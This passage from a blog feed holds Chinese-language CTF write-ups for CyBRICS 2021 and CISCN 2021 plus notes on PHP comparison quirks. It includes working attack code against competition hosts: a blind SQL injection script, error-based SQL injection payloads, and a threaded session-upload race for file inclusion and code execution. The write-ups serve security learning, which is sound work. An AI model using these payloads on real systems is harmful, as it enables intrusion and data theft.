class="variable">$url</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS,<span class="number">3000</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (curl_errno(<span class="variable">$ch</span>) == CURLE_OPERATION_TIMEDOUT) &#123;</span><br><span class="line">            curl_close(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$url</span> = explode(<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$output</span>)[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆到1337就能出flag了。</p><blockquote><p>cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}</p></blockquote><h3 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h3><h4 id="简单sql注入"><a href="#简单sql注入" class="headerlink" title="简单sql注入"></a>简单sql注入</h4><p>基本没ban什么东西，但是要注意一下需要md5编码，直接写脚本盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://announcement-cybrics2021.ctf.su/&quot;</span></span><br><span class="line"><span class="comment"># sql = &quot;select database()&quot;  # announcement</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;  # emails,logs</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;emails&#x27;&quot;  # email,id,timestamp</span></span><br><span class="line"><span class="comment"># sql = &quot;select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;logs&#x27;&quot;  # log</span></span><br><span class="line">sql = <span class="string">&quot;select * from logs&quot;</span>  <span class="comment"># flag  cybrics&#123;1N53r7_0ld_900d_5ql&#125;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right - <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or if((ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>),1,cot(0)), NOW()) #&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;digest&quot;</span>: md5(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(),</span><br><span class="line">            <span class="string">&quot;email&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;cot&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print(f&quot;[*]New left is: &#123;left&#125; and right is: &#123;right&#125;&quot;)</span></span><br><span class="line">    result += <span class="built_in">chr</span>(<span class="built_in">int</span>((left + right) / <span class="number">2</span>))</span><br><span class="line">    print(<span class="string">f&quot;[+]Result new is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>爆出flag</p><blockquote><p>cybrics{1N53r7_0ld_900d_5ql}</p></blockquote><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="CAPTCHA-The-Flag"><a href="#CAPTCHA-The-Flag" class="headerlink" title="CAPTCHA The Flag"></a>CAPTCHA The Flag</h3><p>每张图片都是改过LSB的，用Stegsolve就可以看到CAPTCHA，然后一个一个输就行了。(应该有更加便捷的解法，我这纯属莽</p><p>赛后卓哥给了个分解颜色的<code>python</code>交互式脚本，实在是太妙了，感觉自己还是有很多对于misc的知识点不大明白的(还需提升</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># bit planes codes are from https://medium.com/@stephanie.werli/image-steganography-with-python-83381475da57</span></span><br><span class="line"><span class="comment"># Interactive Script</span></span><br><span class="line"></span><br><span class="line">session = requests.Client(proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    image = session.get(<span class="string">&quot;https://captf-cybrics2021.ctf.su/captcha.php&quot;</span>).content</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    file.write(image)</span><br><span class="line">    file.close()</span><br><span class="line"></span><br><span class="line">    data = np.array(Image.<span class="built_in">open</span>(<span class="string">&quot;./tmp.png&quot;</span>, <span class="string">&quot;r&quot;</span>))</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res = data // <span class="number">2</span> ** k &amp; <span class="number">1</span></span><br><span class="line">        out.append(res * <span class="number">255</span>)</span><br><span class="line">    b = np.hstack(out)</span><br><span class="line">    Image.fromarray(b).show()</span><br><span class="line"></span><br><span class="line">    captcha = <span class="built_in">input</span>(<span class="string">&quot;Enter the captcha you have seen in the window:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;https://captf-cybrics2021.ctf.su/&quot;</span>, data=&#123;<span class="string">&quot;answer&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;captcha&#125;</span>&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">f&quot;[*] Hand up failed.&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">f&quot;[+] Handed up <span class="subst">&#123;captcha&#125;</span> with response <span class="subst">&#123;response.content.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><h4 id="二维码拼接类型题"><a href="#二维码拼接类型题" class="headerlink" title="二维码拼接类型题"></a>二维码拼接类型题</h4><p>写个脚本复原就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">nl = <span class="number">0</span></span><br><span class="line">newImage = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">989</span>, <span class="number">162</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>, <span class="number">145</span>, <span class="number">3</span>):</span><br><span class="line">    print(<span class="string">&quot;[+]New is: ./gif/IMG00%03d.bmp&quot;</span> % i)</span><br><span class="line">    image = Image.<span class="built_in">open</span>((<span class="string">&#x27;./gif/IMG00%03d.bmp&#x27;</span> % i))</span><br><span class="line">    splice = image.crop((<span class="number">46</span>, <span class="number">496</span>, <span class="number">1036</span>, <span class="number">502</span>))</span><br><span class="line">    newImage.paste(splice, (<span class="number">0</span>, nl))</span><br><span class="line">    nl += <span class="number">6</span></span><br><span class="line"></span><br><span class="line">newImage = newImage.resize((<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">newImage.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后一张是个二维码，扫一扫出flag。</p><blockquote><p>cybrics{N0w_Y0u_4r3_4_c4sh13r_LOL}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;Ad-NetWork&quot;&gt;&lt;a href=&quot;#Ad-NetWork&quot; class=&quot;headerlink&quot; title=&quot;A</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://rossweisse.github.io/categories/WriteUp/"/>
    
    
    <category term="CTF" scheme="https://rossweisse.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP特性</title>
    <link href="https://rossweisse.github.io/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/"/>
    <id>https://rossweisse.github.io/2021/07/23/web%E5%AD%A6%E4%B9%A0/PHP%E7%89%B9%E6%80%A7/</id>
    <published>2021-07-23T02:56:00.000Z</published>
    <updated>2021-07-23T03:26:09.452Z</updated>
    
    <content type="html"><![CDATA[<h2 id="各个函数"><a href="#各个函数" class="headerlink" title="各个函数"></a>各个函数</h2><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><blockquote><p>intval() 函数用于获取变量的整数值。<br>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p></blockquote><p>tips: 数组可以用于得到true。可以识别科学计数法。</p><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><blockquote><p>in_array ( mixed $needle , array $haystack , bool $strict = false ) : bool<br>在大海（haystack）中搜索针（ needle）,如果找到 needle 则返回 true，否则返回 false。</p></blockquote><p>如未设置strict，则为弱比较。</p><h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext() / _()"></a>gettext() / _()</h3><p>在当前域中查找消息。</p><p>tips: 唯一一个有别名的函数。</p><h3 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h3><p>%00截断漏洞。</p><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>无法处理数组。</p><p>有回溯次数上限，PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre设定了一个回溯次数上限 pcre.backtrack_limit。</p><p>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><p>无法处理数组。</p><h3 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h3><p>无法处理数组。</p><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="哈希值处理"><a href="#哈希值处理" class="headerlink" title="哈希值处理"></a>哈希值处理</h3><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>常见0e开头的哈希值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"><span class="number">240610708</span></span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br><span class="line"> sha1(str)</span><br><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>)  </span><br><span class="line">sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>)</span><br><span class="line">sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="优先级问题"><a href="#优先级问题" class="headerlink" title="优先级问题"></a>优先级问题</h3><p>and 和 &amp;&amp; 都表示逻辑与，or 和 || 都表示逻辑或，但是优先级不同，&amp;&amp; &gt; ‘=’ &gt; and，|| &gt; ‘=’ &gt; or。</p><p>tips: 注意and 和 = 的位置。</p><h3 id="php原生类"><a href="#php原生类" class="headerlink" title="php原生类"></a>php原生类</h3><h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>可以显示出一个类的相关信息。</p><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>可以获取指定目录下的所有文件。</p><h3 id="字符串解析"><a href="#字符串解析" class="headerlink" title="字符串解析"></a>字符串解析</h3><p>php在解析查询字符串时，会删除空白符，或将某些字符转换为下划线（包括空格）</p><p><a href="https://www.freebuf.com/articles/web/213359.html">具体bypass看这</a></p><h3 id="逻辑与或运算判断"><a href="#逻辑与或运算判断" class="headerlink" title="逻辑与或运算判断"></a>逻辑与或运算判断</h3><blockquote><p>对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;各个函数&quot;&gt;&lt;a href=&quot;#各个函数&quot; class=&quot;headerlink&quot; title=&quot;各个函数&quot;&gt;&lt;/a&gt;各个函数&lt;/h2&gt;&lt;h3 id=&quot;intval&quot;&gt;&lt;a href=&quot;#intval&quot; class=&quot;headerlink&quot; title=&quot;intva</summary>
      
    
    
    
    <category term="Web" scheme="https://rossweisse.github.io/categories/Web/"/>
    
    
    <category term="PHP" scheme="https://rossweisse.github.io/tags/PHP/"/>
    
    <category term="Web" scheme="https://rossweisse.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021部分WriteUp</title>
    <link href="https://rossweisse.github.io/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/"/>
    <id>https://rossweisse.github.io/2021/05/20/WriteUp/CISCN2021%E9%83%A8%E5%88%86WriteUp/</id>
    <published>2021-05-20T12:39:51.000Z</published>
    <updated>2021-07-23T03:27:46.485Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>用无列名报错注入，猜测有flag表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) || updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(no, id))c),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>可以爆出最后还有一个<code>7ba99583-2ac3-40df-ac62-109330206d66</code>列名。</p><p>直接拿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;) || updatexml(1,concat(0x7e,(select &#96;7ba99583-2ac3-40df-ac62-109330206d66&#96; from flag),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>存在备份文件<code>.index.php.swo</code>。</p><p>得到可控新建类和类方法。</p><p>然后利用php内置的<code>ReflectionMethod</code>类读取<code>user</code>类中的每个函数的注释。</p><p>payload在这</p><blockquote><p>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</p></blockquote><p>然后改rb分别查看其他函数就行了，爆出flag。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/bsj14ZtSuUXdHhK.png"></p><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;your flag is in some file in /etc &quot;</span>;</span><br><span class="line">    <span class="variable">$fielf</span>=<span class="variable">$_POST</span>[<span class="string">&quot;field&quot;</span>];</span><br><span class="line">    <span class="variable">$cf</span>=<span class="string">&quot;/tmp/app_auth/cfile/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;cf&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$cf</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$cf</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$$field</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> your flag is in some file in /etc</span><br></pre></td></tr></table></figure><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>扫描可以扫出来一个<code>.listing</code>，里面有一个<code>you_can_seeeeeeee_me.php</code>，打开发现是phpinfo的内容，但是disable_function禁用了很多函数。</p><h4 id="PHP-SESSION-UPLOAD-PROGRESS文件包含"><a href="#PHP-SESSION-UPLOAD-PROGRESS文件包含" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS文件包含"></a>PHP_SESSION_UPLOAD_PROGRESS文件包含</h4><p>我们可以使用PHP_SESSION_UPLOAD_PROGRESS进行文件包含，然后竞争进行rce，<a href="https://www.freebuf.com/vuls/202819.html">原理在这</a>。</p><p>写个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sid = <span class="string">&#x27;a18&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cf&quot;</span>: <span class="string">f&quot;../../../../../var/lib/php/sessions/eaheaeebeb/sess_<span class="subst">&#123;sid&#125;</span>&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;url_here&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">SESS</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = SESS.post(url,</span><br><span class="line">                         data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php var_dump(readfile(&quot;/etc/jhfhabcabi/ghdbcffecc/fffbeacjdg/hfjjaaaabg/fciaaaeehc/fl444444g&quot;));?&gt;&#x27;</span>,</span><br><span class="line">                               &#125;,</span><br><span class="line">                         files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.txt&#x27;</span>, f)&#125;,</span><br><span class="line">                         cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">SESS</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = SESS.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;1.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>tips: POST必须要加files参数进行文件上传，不然session的临时文件是不会生成的。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><p>查看流量包可以发现类似坐标点的数值，全部提取出来然后用脚本生成像素图即可得到字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">XYlocation = [[<span class="number">27</span>, <span class="number">36</span>], [<span class="number">28</span>, <span class="number">35</span>], [<span class="number">29</span>, <span class="number">35</span>], [<span class="number">31</span>, <span class="number">35</span>], [<span class="number">32</span>, <span class="number">35</span>], [<span class="number">33</span>, <span class="number">35</span>], [<span class="number">35</span>, <span class="number">35</span>], [<span class="number">36</span>, <span class="number">35</span>], [<span class="number">37</span>, <span class="number">35</span>], [<span class="number">39</span>, <span class="number">34</span>],</span><br><span class="line">               [<span class="number">40</span>, <span class="number">34</span>], [<span class="number">41</span>, <span class="number">33</span>], [<span class="number">42</span>, <span class="number">32</span>], [<span class="number">43</span>, <span class="number">32</span>], [<span class="number">45</span>, <span class="number">32</span>], [<span class="number">47</span>, <span class="number">31</span>], [<span class="number">48</span>, <span class="number">29</span>], [<span class="number">49</span>, <span class="number">28</span>], [<span class="number">49</span>, <span class="number">27</span>], [<span class="number">50</span>, <span class="number">26</span>],</span><br><span class="line">               [<span class="number">50</span>, <span class="number">25</span>], [<span class="number">51</span>, <span class="number">23</span>], [<span class="number">51</span>, <span class="number">22</span>], [<span class="number">51</span>, <span class="number">21</span>], [<span class="number">52</span>, <span class="number">20</span>], [<span class="number">52</span>, <span class="number">19</span>], [<span class="number">52</span>, <span class="number">18</span>], [<span class="number">52</span>, <span class="number">17</span>], [<span class="number">52</span>, <span class="number">16</span>], [<span class="number">52</span>, <span class="number">15</span>],</span><br><span class="line">               [<span class="number">51</span>, <span class="number">14</span>], [<span class="number">50</span>, <span class="number">14</span>], [<span class="number">49</span>, <span class="number">14</span>], [<span class="number">48</span>, <span class="number">14</span>], [<span class="number">47</span>, <span class="number">14</span>], [<span class="number">46</span>, <span class="number">14</span>], [<span class="number">45</span>, <span class="number">14</span>], [<span class="number">44</span>, <span class="number">14</span>], [<span class="number">43</span>, <span class="number">14</span>], [<span class="number">42</span>, <span class="number">14</span>],</span><br><span class="line">               [<span class="number">40</span>, <span class="number">14</span>], [<span class="number">39</span>, <span class="number">14</span>], [<span class="number">37</span>, <span class="number">14</span>], [<span class="number">35</span>, <span class="number">14</span>], [<span class="number">34</span>, <span class="number">14</span>], [<span class="number">32</span>, <span class="number">14</span>], [<span class="number">30</span>, <span class="number">14</span>], [<span 